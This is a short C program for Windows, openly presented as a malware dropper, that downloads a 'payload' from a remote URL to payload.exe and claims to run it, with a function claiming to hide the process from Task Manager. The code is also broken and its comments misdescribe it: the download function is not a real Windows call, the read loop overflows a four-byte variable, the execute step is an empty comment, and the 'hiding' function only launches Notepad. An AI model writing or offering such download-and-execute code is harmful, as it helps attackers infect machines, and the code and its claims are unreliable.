#include <windows.h>
#include <shellapi.h>
#include <stdio.h>

// Function to download and execute a payload from a remote URL
void downloadAndExecute(char *url, char *payloadPath) {
    FILE *payloadFile;
    DWORD bytesRead;

    // Download the payload from the given URL
    InternetDownloadFile(url, payloadPath, 0x10000, NULL);

    // Open the downloaded file in read mode
    if ((payloadFile = fopen(payloadPath, "rb")) != NULL) {
        while (fread(&bytesRead, 1, 0x10000, payloadFile)) {
            // Execute the payload code here
        }
        fclose(payloadFile);
    }
}

// Function to hide a process from being seen in task manager
void hideProcess() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    CreateProcess(NULL, (LPTSTR)"notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

int main() {
    // Hide the process
    hideProcess();

    // URL to download and execute payload from
    char url[] = "http://example.com/payload";
    
    // Path to save downloaded payload file
    char payloadPath[MAX_PATH];

    // Get the current directory path
    GetCurrentDirectory(MAX_PATH, payloadPath);

    // Append a unique string to the end of the path for the payload file name
    strcat(payloadPath, "\\payload.exe");

    // Download and execute the payload from remote URL
    downloadAndExecute(url, payloadPath);

    return 0;
}
